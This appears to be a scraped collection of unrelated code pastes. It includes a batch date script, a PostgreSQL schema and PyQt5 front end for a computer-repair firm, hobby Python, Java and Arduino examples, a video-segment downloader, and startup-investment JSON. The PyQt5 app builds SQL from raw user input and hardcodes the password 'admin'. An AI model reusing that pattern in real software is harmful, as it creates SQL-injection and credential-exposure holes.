  REM if %yr4% leq 6000 if %yr4% gtr 2100 if %testwell% gtr 0 call :crosscheck
if %testwell% gtr 3  echo done1 and adj == %adj% & echo . & pause & echo .
  endlocal & set ""%~2=%adj%""
  exit /b %errorlevel%


::: In this case, yr4 is not the lookup it is just the YEAR.
::: Handles years up to 2,147,483,647 A.D.
:y10k
if %testwell% gtr 3 echo inside y10k now. & pause
  if %yr4% gtr 2147483000 echo Uh Oh!

    ::: NEAR FATAL Error x2! Begin Again fixes it fine! :::
    if %yr4% gtr 2147483646 echo overload & if exist %util3% call %util3% t :overload 0
    if %yr4% leq 0 echo overload & if exist %util3% call %util3% t :overload 0
::: 
  if exist %util3% call %util3% lenstr :strlen %yr4%
if %testwell% gtr 3 echo .& echo y10k: The length of %yr4% is %lenstr%. & echo .
 REM & pause & echo .
  set /a m2=(%lenstr%-3)
if %testwell% gtr 3 echo y10k pause, lenstr == %lenstr%, and m2 == %m2% & echo . & pause
  REM setlocal EnableExtensions
    REM setlocal EnableDelayedExpansion
      set /a millenium=(!yr4:~0,%m2%!)
      set /a century=(!yr4:~%m2%,1!)
    REM setlocal DisableDelayedExpansion
  REM setlocal DisableExtensions
if %testwell% gtr 3 echo . & echo Y0k: millenium == %millenium%, century == %century% & echo . & pause & echo .
  exit /b %errorlevel%


:crosscheck
  set crosschecker=""%bats%\crosschecker.bat""
  if exist %crosschecker% call %crosschecker%
  echo . & echo That checks out. & echo .
  exit /b %errorlevel%

:::::::::::::::::::[ End of The Century Group ]:::::::::::::::::::


:monthkey <int keyReturned, int monthNum, int year>
  setlocal & set /a num=%~2 & set /a year=%~3
  if %num% equ 1 set /a key=1
  if %num% equ 10 set /a key=1
  if %num% equ 2 set /a key=4
  if %num% equ 3 set /a key=4
  if %num% equ 11 set /a key=4
      ::: If mod equ 0 then it's a Leapyear, evenly divisible by 4.
      REM set /a mod=%year:~0,4% %% 4% 
    REM if %mod% neq 0 
    if %num% equ 4 set /a key=0
    REM if %mod% neq 0 
    if %num% equ 7 set /a key=0
  if %num% equ 5 set /a key=2
  if %num% equ 6 set /a key=5
  if %num% equ 7 set /a key=0
  if %num% equ 8 set /a key=3
  if %num% equ 9 set /a key=6
  if %num% equ 12 set /a key=6
      ::: Code it in as + a hundred if it's leapyear! :::
      REM if %mod% equ 0 if %num% neq 4 if %num% neq 7 set /a key+=100
      set /a mod=%year:~0,4% %% 4% 
      if %mod% equ 0 set /a key+=100
  endlocal & set ""%~1=%key%""
  exit /b %errorlevel%


::: Get day of week word from day number.
:getdow <int weekdayNum, string weekday2Return>
  setlocal & set /a ""dow=%~1""
  if %dow% equ 0 set /a dow=7
  if %dow% equ 1 set weekday=Sunday
  if %dow% equ 2 set weekday=Monday
  if %dow% equ 3 set weekday=Tuesday
  if %dow% equ 4 set weekday=Wednesday
  if %dow% equ 5 set weekday=Thursday
  if %dow% equ 6 set weekday=Friday
  if %dow% equ 7 set weekday=Saturday
  endlocal & set ""%~2=%weekday%""
  exit /b %errorlevel%


:fetch <int yearLast2, int monthNum, int dayOfMonth>
  setlocal
  set /a yearLast2=(%date:~2,2%)
  set ""monthNum=%date:~5,2%""
  if ""%monthNum:~0,1%"" equ "" "" set /a monthNum=(%monthNum:~1,1%)
  if ""%monthNum:~0,1%"" equ ""0"" set /a monthNum=(%monthNum:~1,1%)
  set ""dayOfMonth=%date:~8,2%""
  if ""%dayOfMonth:~0,1%"" equ "" "" set /a dayOfMonth=(%dayOfMonth:~1,1%)
  if ""%dayOfMonth:~0,1%"" equ ""0"" set /a dayOfMonth=(%dayOfMonth:~1,1%)
  endlocal & set ""%~1=%yearLast2%"" & set ""%~2=%monthNum%"" & set ""%~3=%dayOfMonth%""
  exit /b %errorlevel%


:errr
  setlocal
  echo . & echo Developmental CheckPoint!
  echo Enviromental Pollution. & echo .
  echo Something peculiar is amiss?
  echo . & pause & echo .
  endlocal
  exit /b %errorlevel%



  ::: 100% -JpE-


"
x5jCUzGs,ИСФРКТ БД,psychotrip,PostgreSQL,Friday 19th of January 2024 10:38:06 AM CDT,"CREATE DATABASE computer_repair_firm
    WITH
    OWNER = postgres
    ENCODING = 'UTF8'
    LC_COLLATE = 'Russian_Russia.1251'
    LC_CTYPE = 'Russian_Russia.1251'
    TABLESPACE = pg_default
    CONNECTION LIMIT = -1
    IS_TEMPLATE = False;

COMMENT ON DATABASE computer_repair_firm
    IS 'База данных информационной системы фирмы по ремонту компьютерной техники';


CREATE TABLE IF NOT EXISTS public.clients
(
    client_code integer NOT NULL DEFAULT nextval('clients_client_code_seq'::regclass),
    full_name character varying(255) COLLATE pg_catalog.""default"",
    address character varying(255) COLLATE pg_catalog.""default"",
    phone_number character varying(15) COLLATE pg_catalog.""default"",
    email character varying(255) COLLATE pg_catalog.""default"",
    CONSTRAINT clients_pkey PRIMARY KEY (client_code)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.clients
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.component_order
(
    component_code integer NOT NULL,
    order_number integer NOT NULL,
    quantity integer,
    CONSTRAINT component_order_pkey PRIMARY KEY (component_code, order_number),
    CONSTRAINT component_order_component_code_fkey FOREIGN KEY (component_code)
        REFERENCES public.components (component_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT component_order_order_number_fkey FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_component_order_components FOREIGN KEY (component_code)
        REFERENCES public.components (component_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_component_order_orders FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.component_order
    OWNER to postgres;
    
    
CREATE TABLE IF NOT EXISTS public.components
(
    component_code integer NOT NULL DEFAULT nextval('components_component_code_seq'::regclass),
    name character varying(255) COLLATE pg_catalog.""default"",
    cost numeric(10,2),
    available_quantity integer,
    CONSTRAINT components_pkey PRIMARY KEY (component_code)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.components
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.employee_order
(
    order_number integer NOT NULL,
    employee_id integer NOT NULL,
    CONSTRAINT employee_order_pkey PRIMARY KEY (order_number, employee_id),
    CONSTRAINT employee_order_employee_id_fkey FOREIGN KEY (employee_id)
        REFERENCES public.employees (employee_id) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT employee_order_order_number_fkey FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_employee_order_employees FOREIGN KEY (employee_id)
        REFERENCES public.employees (employee_id) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.employee_order
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.employees
(
    employee_id integer NOT NULL DEFAULT nextval('employees_employee_id_seq'::regclass),
    full_name character varying(255) COLLATE pg_catalog.""default"",
    ""position"" character varying(255) COLLATE pg_catalog.""default"",
    phone_number character varying(15) COLLATE pg_catalog.""default"",
    CONSTRAINT employees_pkey PRIMARY KEY (employee_id)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.employees
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.order_service
(
    order_number integer NOT NULL,
    service_code integer NOT NULL,
    quantity integer,
    CONSTRAINT order_service_pkey PRIMARY KEY (order_number, service_code),
    CONSTRAINT fk_order_service_orders FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_order_service_services FOREIGN KEY (service_code)
        REFERENCES public.services (service_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT order_service_order_number_fkey FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT order_service_service_code_fkey FOREIGN KEY (service_code)
        REFERENCES public.services (service_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.order_service
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.orders
(
    order_number integer NOT NULL DEFAULT nextval('orders_order_number_seq'::regclass),
    client_code integer,
    device_type character varying(255) COLLATE pg_catalog.""default"",
    status character varying(255) COLLATE pg_catalog.""default"",
    start_date date,
    problem_description text COLLATE pg_catalog.""default"",
    repair_description text COLLATE pg_catalog.""default"",
    repair_cost numeric(10,2),
    completion_date date,
    CONSTRAINT orders_pkey PRIMARY KEY (order_number),
    CONSTRAINT orders_client_code_fkey FOREIGN KEY (client_code)
        REFERENCES public.clients (client_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.orders
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.services
(
    service_code integer NOT NULL DEFAULT nextval('services_service_code_seq'::regclass),
    name character varying(255) COLLATE pg_catalog.""default"",
    cost numeric(10,2),
    description text COLLATE pg_catalog.""default"",
    CONSTRAINT services_pkey PRIMARY KEY (service_code)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.services
    OWNER to postgres;    "
diWg5RFM,ИСФРКТ Back,psychotrip,Python,Friday 19th of January 2024 10:34:34 AM CDT,"import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QComboBox, QLabel, QLineEdit, QPushButton, QWidget
from PyQt5.QtCore import QLocale
import psycopg2


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.init_ui()

    def init_ui(self):
        self.setWindowTitle('Информационная система менеджера фирмы по ремонту компьютерной техники')
        self.setGeometry(100, 100, 400, 200)

        # Установка русского языка для интерфейса
        locale = QLocale(QLocale.Russian, QLocale.Russia)
        locale.setDefault(locale)

        # Создание подключения к базе данных
        self.conn = psycopg2.connect(
            database=""computer_repair_firm"",
            user=""postgres"",
            password=""admin"",
            host=""localhost"",
            port=""5432""
        )

        # Словарь с соответствием русских и английских названий таблиц
        self.table_names = {
            'Заказы': 'orders',
            'Клиенты': 'clients',
            'Услуги_заказа': 'order_service',
            'Услуги': 'services',
            'Заказы_сотрудников': 'employee_order',
            'Сотрудники': 'employees',
            'Комплектующие_заказа': 'component_order',
            'Комплектующие': 'components'
        }

        # Словарь с атрибутами для каждой таблицы
        self.table_attributes = {
            'Заказы': ['client_code', 'device_type', 'status', 'start_date', 'problem_description',
                       'repair_description', 'repair_cost', 'completion_date'],
            'Клиенты': ['full_name', 'address', 'phone_number', 'email'],
            'Услуги_заказа': ['order_number', 'service_code', 'quantity'],
            'Услуги': ['name', 'cost', 'description'],
            'Заказы_сотрудников': ['order_number', 'employee_id'],
            'Сотрудники': ['full_name', 'position', 'phone_number'],
            'Комплектующие_заказа': ['component_code', 'order_number', 'quantity'],
            'Комплектующие': ['name', 'cost', 'available_quantity']
        }

        # Создание основного макета
        layout = QVBoxLayout()

        # Выбор таблицы с помощью комбо-бокса
        self.table_combo = QComboBox(self)
        self.table_combo.addItems(self.table_names.keys())
        self.table_combo.currentIndexChanged.connect(self.populate_fields)
        layout.addWidget(self.table_combo)

        # Создание макета для полей ввода
        self.input_layout = QVBoxLayout()
        layout.addLayout(self.input_layout)

        # Добавление кнопки для вставки данных
        insert_button = QPushButton('Вставить данные', self)
        insert_button.clicked.connect(self.insert_data)
        layout.addWidget(insert_button)

        # Создание центрального виджета и установка макета
        central_widget = QWidget(self)
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

    def populate_fields(self, index):
        # Очистка предыдущих виджетов ввода
        for i in reversed(range(self.input_layout.count())):
            widget = self.input_layout.itemAt(i).widget()
            if widget:
                widget.setParent(None)

        # Добавление виджетов ввода и соответствующих меток для выбранной таблицы
        table_name = self.table_combo.currentText()
        attributes = self.table_attributes[table_name]
        self.input_labels = []
        self.input_edits = []
        for attribute in attributes:
            label = QLabel(f""{attribute}:"")
            edit = QLineEdit()
            self.input_labels.append(label)
            self.input_edits.append(edit)
            self.input_layout.addWidget(label)
            self.input_layout.addWidget(edit)

    def insert_data(self):
        try:
            table_name_russian = self.table_combo.currentText()
            table_name_english = self.table_names[table_name_russian]

            # Подготовка SQL-запроса
            column_names = [attribute for attribute in self.table_attributes[table_name_russian]]
            columns = ', '.join(column_names)
            values = ', '.join([f""'{edit.text()}'"" for edit in self.input_edits])

            query = f""INSERT INTO {table_name_english} ({columns}) VALUES ({values});""

            # Выполнение запроса
            with self.conn.cursor() as cursor:
                cursor.execute(query)

            # Применение изменений
            self.conn.commit()

        except Exception as e:
            print(f""Ошибка: {e}"")
            self.conn.rollback()

        finally:
            # Очистка полей ввода
            for edit in self.input_edits:
                edit.clear()


def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
"
rL9bbzwa,# t_chase.py *updated*,here2share,Python,Friday 19th of January 2024 10:17:58 AM CDT,"# t_chase.py *updated*

import turtle
import random

rainbow=[]
def z(r,g,b):
    rainbow.append((r,g,b))
r,g,b=255,0,0
for g in range(256):
    z(r,g,b)
for r in range(254, -1, -1):
    z(r,g,b)
for b in range(256):
    z(r,g,b)
for g in range(254, -1, -1):
    z(r,g,b)
for r in range(256):
    z(r,g,b)
for b in range(254, -1, -1):
    z(r,g,b)
Lc = len(rainbow)

n=300
ccc = Lc/(n+1)

screen = turtle.Screen()
screen.tracer(0,0)
screen.setup(600,600)
screen.title('Chase')
turtle.hideturtle()

chasers = []
for i in range(n):
    chasers.append(turtle.Turtle())

for i in range(n):
	c = '#%02x%02x%02x' % (rainbow[int(i*ccc)])
	chasers[i].up()
	chasers[i].color(c)
	chasers[i].goto(random.uniform(-500,500), random.uniform(-500,500))
chasers[n-1].goto(0,0)
chasers[n-1].shape('circle')
chasers[n-1].shapesize(1)

orbit=2
ppp = range(1,9)
ccc = 0

while 1:
	if ccc < 280:
		for i in range(n-1):
			angle = chasers[i].towards(chasers[i+1])
			chasers[i].seth(angle)
	zzz = chasers[n-1].pos()
	for z in zzz:
		if abs(z) > 200:
			angle = chasers[n-1].towards(0,0)
			chasers[n-1].seth(angle)
			orbit = random.choice(ppp)
	chasers[n-1].left(orbit)
	chasers[n-1].fd(10)
	for i in range(n-1):
		chasers[i].fd(10)
	ccc = ccc%300 + 1
	screen.update()"
SFR4hBvH,Untitled,Coder_228,C++,Friday 19th of January 2024 09:45:07 AM CDT,"/*
 * See documentation at https://nRF24.github.io/RF24
 * See License information at root directory of this library
 * Author: Brendan Doherty (2bndy5)
 */

/**
 * A simple example of sending data from 1 nRF24L01 transceiver to another.
 *
 * This example was written to be used on 2 devices acting as ""nodes"".
 * Use the Serial Monitor to change each node's behavior.
 */
#include <SPI.h>
#include ""printf.h""
#include ""RF24.h""

#define CE_PIN D4
#define CSN_PIN D2
// instantiate an object for the nRF24L01 transceiver
RF24 radio(CE_PIN, CSN_PIN);

// Let these addresses be used for the pair
uint8_t address[][6] = { ""1Node"", ""2Node"" };
// It is very helpful to think of an address as a path instead of as
// an identifying device destination

// to use different addresses on a pair of radios, we need a variable to
// uniquely identify which address this radio will use to transmit
bool radioNumber = 1;  // 0 uses address[0] to transmit, 1 uses address[1] to transmit

// Used to control whether this node is sending or receiving
bool role = false;  // true = TX role, false = RX role

// For this example, we'll be using a payload containing
// a single float number that will be incremented
// on every successful transmission
float payload = 0.0;

void setup() {

  Serial.begin(115200);
  while (!Serial) {
    // some boards need to wait to ensure access to serial over USB
  }

  // initialize the transceiver on the SPI bus
  if (!radio.begin()) {
    Serial.println(F(""radio hardware is not responding!!""));
    while (1) {}  // hold in infinite loop
  }

  // print example's introductory prompt
  Serial.println(F(""RF24/examples/GettingStarted""));

  // To set the radioNumber via the Serial monitor on startup
  Serial.println(F(""Which radio is this? Enter '0' or '1'. Defaults to '0'""));
  while (!Serial.available()) {
    // wait for user input
  }
  char input = Serial.parseInt();
  radioNumber = input == 1;
  Serial.print(F(""radioNumber = ""));
  Serial.println((int)radioNumber);

  // role variable is hardcoded to RX behavior, inform the user of this
  Serial.println(F(""*** PRESS 'T' to begin transmitting to the other node""));

  // Set the PA Level low to try preventing power supply related problems
  // because these examples are likely run with nodes in close proximity to
  // each other.
  radio.setChannel(0x76);  // 108 (base 10) or 0x6C (base 16) - 2.476GHz
  radio.setAutoAck(false);  
  radio.setDataRate(RF24_1MBPS);
  radio.setPALevel(RF24_PA_LOW);  // RF24_PA_MAX is default.

  // save on transmission time by setting the radio to only transmit the
  // number of bytes we need to transmit a float
  radio.setPayloadSize(sizeof(payload));  // float datatype occupies 4 bytes

  // set the TX address of the RX node into the TX pipe
  radio.openWritingPipe(address[radioNumber]);  // always uses pipe 0

  // set the RX address of the TX node into a RX pipe
  radio.openReadingPipe(1, address[!radioNumber]);  // using pipe 1

  // additional setup specific to the node's role
  if (role) {
    radio.stopListening();  // put radio in TX mode
  } else {
    radio.startListening();  // put radio in RX mode
  }

  // For debugging info
  // printf_begin();             // needed only once for printing details
  // radio.printDetails();       // (smaller) function that prints raw register values
   radio.printPrettyDetails(); // (larger) function that prints human readable data

}  // setup

void loop() {

  if (role) {
    // This device is a TX node

    unsigned long start_timer = micros();                // start the timer
    bool report = radio.write(&payload, sizeof(float));  // transmit & save the report
    unsigned long end_timer = micros();                  // end the timer

    if (report) {
      Serial.print(F(""Transmission successful! ""));  // payload was delivered
      Serial.print(F(""Time to transmit = ""));
      Serial.print(end_timer - start_timer);  // print the timer result
      Serial.print(F("" us. Sent: ""));
      Serial.println(payload);  // print payload sent
      payload += 0.01;          // increment float payload
    } else {
      Serial.println(F(""Transmission failed or timed out""));  // payload was not delivered
    }

    // to make this example readable in the serial monitor
    delay(1000);  // slow transmissions down by 1 second

  } else {
    // This device is a RX node

    uint8_t pipe;
    if (radio.available(&pipe)) {              // is there a payload? get the pipe number that recieved it
      uint8_t bytes = radio.getPayloadSize();  // get the size of the payload
      radio.read(&payload, bytes);             // fetch payload from FIFO
      Serial.print(F(""Received ""));
      Serial.print(bytes);  // print the size of the payload
      Serial.print(F("" bytes on pipe ""));
      Serial.print(pipe);  // print the pipe number
      Serial.print(F("": ""));
      Serial.println(payload);  // print the payload's value
    }
  }  // role

  if (Serial.available()) {
    // change the role via the serial monitor

    char c = toupper(Serial.read());
    if (c == 'T' && !role) {
      // Become the TX node

      role = true;
      Serial.println(F(""*** CHANGING TO TRANSMIT ROLE -- PRESS 'R' TO SWITCH BACK""));
      radio.stopListening();

    } else if (c == 'R' && role) {
      // Become the RX node

      role = false;
      Serial.println(F(""*** CHANGING TO RECEIVE ROLE -- PRESS 'T' TO SWITCH BACK""));
      radio.startListening();
    }
  }

}  // loop"
jNU3aT2t,Vowel count,ifigazsi,Python,Friday 19th of January 2024 09:35:15 AM CDT,"#### A ####

sentence = ""Hello World.""
vowels = {""a"", ""e"", ""i"", ""o"", ""u""}
stat = {}
for c in sentence.lower():
    if c in vowels:
        stat[c] = stat.get(c, 0) + 1
print(stat)

#### B ####
sentence = ""Hello World.""
vowels = {""a"", ""e"", ""i"", ""o"", ""u""}
for v in vowels:
    print(f""{v}: {sentence.lower().count(v)}"")

#### C ####
sentence = ""Hello World.""
print([(x, sentence.lower().count(x)) for x in {""a"", ""e"", ""i"", ""o"", ""u""}])"
E162cDn0,main.py,Dragon1573,Python,Friday 19th of January 2024 09:34:41 AM CDT,"import asyncio
from logging import INFO, error, info, warning, basicConfig
from re import search
import httpx
from lxml.etree import HTML
from aiofiles import open
from os.path import join


URL = ""https://www.ahsnxc.com/vodplay/49144-1-1.html""
HEADER = {
    ""User-Agent"": (
        ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ""
        ""Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0""
    )
}

basicConfig(
    format=""%(asctime)s [%(levelname)s] %(message)s"",
    datefmt=""%Y-%m-%d %H:%M:%S"",
    level=INFO,
)


async def get_data(_client: httpx.AsyncClient, _url: str) -> str:
    response = await _client.get(_url)
    return response.text


async def get_first_m3u8(_data: str) -> str:
    dom = HTML(_data)
    url: str = dom.xpath('//div[@class=""play-window""]/script/text()')[0]  # type: ignore
    if result := search(r'.*?""url"":""(.*?)"",', url):
        return result.group(1).replace(""\\"", """")
    return """"


async def get_second_m3u8(_client: httpx.AsyncClient, _m3u8: str) -> str:
    data = await get_data(_client, _m3u8)
    sub_url = data.split()[-1]
    return _m3u8.split(""index"")[0] + sub_url


async def download(_client: httpx.AsyncClient, _url: str):
    for _ in range(5):
        try:
            ts_name = _url.split(""/"")[-1]
            info(f""{ts_name} 开始下载！"")
            response = await _client.get(_url, timeout=20, headers=HEADER)
            info(f""{ts_name} 下载完成！"")
            async with open(join(""movies"", ts_name), ""wb"") as file:
                await file.write(response.content)
                info(f""{ts_name} 写入完成！"")
            break
        except httpx.TimeoutException:
            error(f""{_url} 请求超时！"")
        except Exception:
            warning(f""{_url} 下载失败！"")


async def download_all(_client: httpx.AsyncClient, _m3u8: str):
    data = (await _client.get(_m3u8)).text
    async with open(""ts.txt"", ""w"", encoding=""UTF-8"") as file:
        await file.write(data)
    async with open(""ts.txt"", ""r"", encoding=""UTF-8"") as file:
        lines = await file.readlines()
        lines = [_.strip() for _ in lines]
        tasks = [asyncio.ensure_future(download(_client, _)) for _ in lines if not _.startswith(""#"")]
    await asyncio.gather(*tasks)


async def main():
    async with httpx.AsyncClient(headers=HEADER, http2=True, timeout=2.0) as client:
        data = await get_data(client, URL)
        m3u8_01 = await get_first_m3u8(data)
        m3u8_02 = await get_second_m3u8(client, m3u8_01)
        await download_all(client, m3u8_02)


if __name__ == ""__main__"":
    asyncio.run(main())
"
3YdP8Xji,wmic csproduct get uuid,Latthawit,Python,Friday 19th of January 2024 09:11:12 AM CDT,032E02B4-0499-0540-C106-520700080009
TC8ZCS3L,TP02_Punto01,gabriel097,Java,Friday 19th of January 2024 08:29:11 AM CDT,"/*
1) Incorporar un método a la definición de clase Stack (versiones básica o genérica propuestas en teoría) que
reciba como parámetro un valor y realice la operación de eliminación de ese valor sobre el objeto Stack
que está ejecutando el mensaje o método.
Modifique el programa escrito de manera que permita optar entre el ingreso de valores por consola o por
un generador de valores aleatorios.
Indicaciones:
Este ejercicio necesita del objeto scanner para ingresar datos por la consola o teclado, se espera que el
código controle los problemas que normalmente ocurren al operar con la consola o teclado.
Se espera una correcta modularización entre el código que realiza el ingreso y validación de los datos
respecto del código que hace lo que se solicita en el ejercicio. El ejercicio debe implementar un mecanismo 
para seleccionar el ingreso de valores por consola o generados aleatoriamente.
 */
public class Punto01 {

    static Stack<Integer> pila = new Stack();

    public static void main(String[] args) {
        char resp;
        int op;
        do {
            System.out.println(""********Menu********"" + ""\n1 - Cargar valor en la pila"" + ""\n2 - Mostrar elementos de la pila""
                    + ""\n3 - Retirar elemento/s de la pila"" + ""\n4 - Salir"");
            op = helper.ValidarIntPositivo(""Ingrese de nuevo"");
            switch (op) {
                case 1:
                    do {
                        System.out.println(""Elemento cargado: "" + pila.push(valor()));
                        System.out.println(""Continuar cargando? s/n"");
                        resp = helper.validarRespuesta();
                    } while (resp != 'n');
                    break;
                case 2:
                    System.out.println(pila.toString());
                    break;
                case 3:
                    while (!pila.empty()) {
                        System.out.println(""Elemento eliminado: "" + pila.pop());
                    }
                    break;
                case 4:
                    System.out.println(""Adios...."");
                    break;
                default:
                    System.out.println(""Opcion incorrecta..."");
            }
        } while (op != 4);
    }

    static int valor() {

        int numero = 0;
        System.out.println(""-----Carga de Valor-----"" + ""\n1 - Ingreso por consola"" + ""\n2 - Generar Nro Aleatorio"");
        int op = helper.ValidarIntPositivo(""Ingrese de nuevo"");

        switch (op) {
            case 1:
                System.out.println(""Ingrese un valor..."");
                numero = helper.ValidarIngresoInt(""Vuelva a ingresar..."");
                break;
            case 2:
                numero = helper.ramdomInt(100);
                System.out.println(""--->Valor generado:"" + numero);
                break;
            default:
                System.out.println(""Opcion incorrecta..."");
        }
        return numero;

    }

}
"
7bNFEDSM,Stack,gabriel097,Java,Friday 19th of January 2024 08:27:13 AM CDT,"
/*
The Stack class represents a last-in-first-out (LIFO) stack of objects.
 
The usual push and pop operations are provided, as well as a method to
peek at the top item on the stack, a method to test for whether the
stack is empty, and a method to search the stack for an item and discover
how far it is from the top.
 
When a stack is first created, it contains no items.
 
from https://docs.oracle.com/en/java/javase/13/docs/api/java.base/java/util/Stack.html
from https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/Stack.html
from https://docs.oracle.com/en/java/javase/15/docs/api/java.base/java/util/Stack.html
 
 */
public class Stack<ELEMENT> {
 
    //region Constants
 
    private final static Integer defaulDimension = 10;
 
    //endregion
 
    //region Attributes
 
    private ELEMENT [] data;
    private Integer count;
 
    //endregion
 
    //region Constructors
 
    public Stack() {
        this(Stack.defaulDimension);
    }
    public Stack(Integer dimension) {
        if (dimension <= 0) {
            throw new RuntimeException(""La cantidad de elementos en la  pila debe ser positiva"");
        }
        this.data = (ELEMENT []) new Object[dimension];
        this.count = 0;
    }
 
    //endregion
 
    //region Stack Methods
 
    // Test if this stack is empty.
    public boolean empty() {
        return this.count <= 0;
    }
 
    // Looks at the object at the top of this stack without removing it from the stack.
    public ELEMENT peek() {
        if (this.empty()) {
            throw new RuntimeException(""La pila está vacía..."");
        }
        return this.data[this.count - 1];
    }
 
    // Removes the object at the top of this stack and returns that object as the value of this function.
    public ELEMENT pop() {
        if (this.empty()) {
            throw new RuntimeException(""La pila está vacía..."");
        }
        --this.count;
        return this.data[this.count];
    }
 
    // Pushes an item onto the top of this stack.
    public ELEMENT push(ELEMENT element) {
        if (this.size() >= this.data.length) {
//            throw new RuntimeException(""La pila está llena..."");
 
            ELEMENT [] temp = (ELEMENT []) new Object[this.data.length * 2];
            for (int i = 0; i < this.data.length; ++i) {
                temp[i] = this.data[i];
            }
            this.data = temp;
        }
        this.data[this.count] = element;
        ++this.count;
        return element;
    }
 
    // Returns the 1-based position where an object is on this stack.
    public int search(Object object) {
        for (int pos = this.count - 1; pos >= 0; --pos) {
            if (this.data[pos].equals(object)) {
                return this.count - pos;
            }
        }
        return -1;
    }
    //endregion
 
    //region Inherited Methods
 
    // from https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/Vector.html
    // Returns the number of components in this vector.
    public int size() {
        return this.count;
    }
 
    //endregion
 
 
 
    //region Override Object basic methods
 
    @Override
    public String toString() {
 
        if (this.size() <=0) {
            return """";
        }
 
        // from https://docs.oracle.com/en/java/javase/15/docs/api/java.base/java/lang/StringBuilder.html
        StringBuilder sb = new StringBuilder();
        sb.append(""["" + this.data[0].toString());
        for (int i = 1; i < this.size(); ++i) {
            sb.append("", "" + this.data[i].toString());
        }
        sb.append(""]"");
        return sb.toString();
    }
    //endregion
 
 
}"
iRgbEsK1,techstars,isakura132,JSON,Friday 19th of January 2024 07:27:15 AM CDT,"    ""investments"": [
      {
        ""raised_usd"": 6535912,
        ""name"": ""Seed Round - Heex Technologies"",
        ""organization"": ""Heex Technologies"",
        ""announced_on"": ""2024-01-18"",
        ""is_lead_investor"": false
      },
      {
        ""raised_usd"": 464635,
        ""name"": ""Pre Seed Round - Trudenty"",
        ""organization"": ""Trudenty"",
        ""announced_on"": ""2024-01-15"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 7700000,
        ""name"": ""Pre Seed Round - Echo Labs"",
        ""organization"": ""Echo Labs"",
        ""announced_on"": ""2024-01-10"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 5324999,
        ""name"": ""Seed Round - PierSight Space"",
        ""organization"": ""PierSight Space"",
        ""announced_on"": ""2024-01-09"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 1000000,
        ""name"": ""Pre Seed Round - Imaginario AI"",
        ""organization"": ""Imaginario AI"",
        ""announced_on"": ""2023-12-19"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - Swoove"",
        ""organization"": ""Swoove"",
        ""announced_on"": ""2023-12-15"",
        ""is_lead_investor"": true
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - Jump n Pass"",
        ""organization"": ""Jump n Pass"",
        ""announced_on"": ""2023-12-15"",
        ""is_lead_investor"": true
      },
      {
        ""raised_usd"": 20000,
        ""name"": ""Pre Seed Round - Veend"",
        ""organization"": ""Veend"",
        ""announced_on"": ""2023-12-14"",
        ""is_lead_investor"": true
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - GetEquity"",
        ""organization"": ""GetEquity"",
        ""announced_on"": ""2023-12-14"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - Beauty Hut"",
        ""organization"": ""Beauty Hut"",
        ""announced_on"": ""2023-12-14"",
        ""is_lead_investor"": true
      }
    ],
    ""investors"": [
      {
        ""is_lead_investor"": true,
        ""name"": ""SVB Financial Group""
      },
      {
        ""is_lead_investor"": null,
        ""name"": ""Foundry Group""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Avalon Ventures""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Foundry Group""
      },
      {
        ""is_lead_investor"": false,
